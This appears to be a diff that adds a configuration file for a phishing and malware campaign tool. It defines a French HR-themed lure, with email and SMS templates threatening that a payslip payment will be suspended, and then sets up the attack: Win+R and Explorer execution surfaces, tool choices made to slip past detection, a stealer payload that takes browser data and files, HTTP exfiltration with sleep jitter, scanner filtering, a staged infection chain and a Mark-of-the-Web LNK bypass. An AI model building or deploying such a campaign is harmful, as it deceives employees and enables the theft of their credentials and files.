@@ -1,0 +1,44 @@
+{
+  "id": "hr",
+  "label": "Fiche de paie bloquée — re-signature demandée",
+  "persona": {
+    "brand": "RH Sarthe",
+    "voice": "ressources humaines, ton administratif RH",
+    "urgency": "high",
+    "lexicon": ["fiche de paie", "signature", "bulletin", "portail RH"]
+  },
+  "scenarios": ["docusign", "printer_issue", "meeting_invite"],
+  "channels": {
+    "email": {
+      "subject": "Bulletin de paie {ref} — signature numérique en attente",
+      "body": "Bonjour {name},\n\nVotre bulletin de paie du site {city} a été numérisé mais la signature électronique est en échec. Sans re-signation avant {deadline}, le virement de {amount} est automatiquement suspendu.\n\nRe-signez sur le portail :\n{lure}\n\nService RH — {agent}"
+    },
+    "sms": {
+      "body": "RH : bulletin {ref} non signé, virement {amount} suspendu. Re-signez avant {deadline} : {lure}"
+    }
+  },
+  "context": {
+    "inject": ["ref", "city", "deadline", "amount"]
+  },
+  "techniques": {
+    "surfaces": ["winr", "explorer"],
+    "min_reliability": 4,
+    "prefer_tags": ["core", "default"],
+    "avoid": ["winr-certutil", "winr-bitsadmin"]
+  },
+  "payload": {
+    "kind": "stealer",
+    "collect": ["browser", "files"],
+    "exfil": "http",
+    "sleep": 45,
+    "jitter": 0.5,
+    "edr_hint": ""
+  },
+  "opsec": {
+    "filter_scanners": true,
+    "dwell_hours": 8,
+    "variant_count": 3
+  },
+  "chain": ["lure", "stager", "stage2", "collect", "exfil"],
+  "exploits": ["motw-lnk"]
+}
